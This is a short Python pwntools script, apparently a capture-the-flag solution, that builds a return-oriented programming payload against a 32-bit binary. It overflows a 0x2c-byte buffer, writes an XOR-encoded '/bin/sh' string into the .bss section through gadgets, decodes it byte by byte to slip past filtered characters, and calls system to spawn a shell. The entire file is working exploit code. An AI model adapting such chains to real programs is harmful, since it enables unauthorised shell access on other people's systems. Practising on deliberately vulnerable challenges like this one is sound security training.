from pwn import *

sys_addr = 0x80484e0
bss_addr = 0x0804a040

xor_addr = 0x08048890
#pop_ebx_addr = 0x08048461
#pop_ecx_addr = 0x08048897
pop_ebx_ecx_addr = 0x08048896

mov_addr = 0x08048893
pop_addr = 0x08048899

shell = '/bin/sh\x00'
xor_shell = ''
for i in shell:
    xor_shell += chr(ord(i) ^ 2)

payload = 'a' * (0x28 + 0x4)
payload += p32(pop_addr) + xor_shell[0:4] + p32(bss_addr) + p32(mov_addr)
payload += p32(pop_addr) + xor_shell[4:8] + p32(bss_addr + 4) + p32(mov_addr)

for j in range(len(xor_shell)):
    #payload += p32(pop_ebx_addr)
    #payload += p32(bss_addr + j)
    #payload += p32(pop_ecx_addr)
    payload += p32(pop_ebx_ecx_addr)
    payload += p32(bss_addr + j)
    payload += p32(2)
    payload += p32(xor_addr)

payload += p32(sys_addr) + p32(0xdeadbeef) + p32(bss_addr)

print len(payload)